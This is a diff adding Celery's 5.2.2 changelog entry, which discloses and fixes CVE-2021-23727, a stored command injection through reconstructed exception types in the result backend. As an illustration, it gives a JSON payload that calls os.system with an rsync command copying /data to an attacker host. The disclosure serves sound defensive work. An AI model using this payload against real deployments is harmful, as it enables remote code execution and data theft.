@@ -8,6 +8,44 @@ This document contains change notes for bugfix & new features
 in the & 5.2.x series, please see :ref:`whatsnew-5.2` for
 an overview of what's new in Celery 5.2.
 
+.. _version-5.2.2:
+
+5.2.2
+=====
+
+:release-date: 2021-12-26 16:30 P.M UTC+2:00
+:release-by: Omer Katz
+
+- Various documentation fixes.
+- Fix CVE-2021-23727 (Stored Command Injection security vulnerability).
+
+    When a task fails, the failure information is serialized in the backend.
+    In some cases, the exception class is only importable from the
+    consumer's code base. In this case, we reconstruct the exception class
+    so that we can re-raise the error on the process which queried the
+    task's result. This was introduced in #4836.
+    If the recreated exception type isn't an exception, this is a security issue.
+    Without the condition included in this patch, an attacker could inject a remote code execution instruction such as:
+    ``os.system("rsync /data attacker@192.168.56.100:~/data")``
+    by setting the task's result to a failure in the result backend with the os,
+    the system function as the exception type and the payload ``rsync /data attacker@192.168.56.100:~/data`` as the exception arguments like so:
+
+    .. code-block:: python
+
+        {
+              "exc_module": "os",
+              'exc_type': "system",
+              "exc_message": "rsync /data attacker@192.168.56.100:~/data"
+        }
+
+    According to my analysis, this vulnerability can only be exploited if
+    the producer delayed a task which runs long enough for the
+    attacker to change the result mid-flight, and the producer has
+    polled for the task's result.
+    The attacker would also have to gain access to the result backend.
+    The severity of this security vulnerability is low, but we still
+    recommend upgrading.
+
 
 .. _version-5.2.1:
 
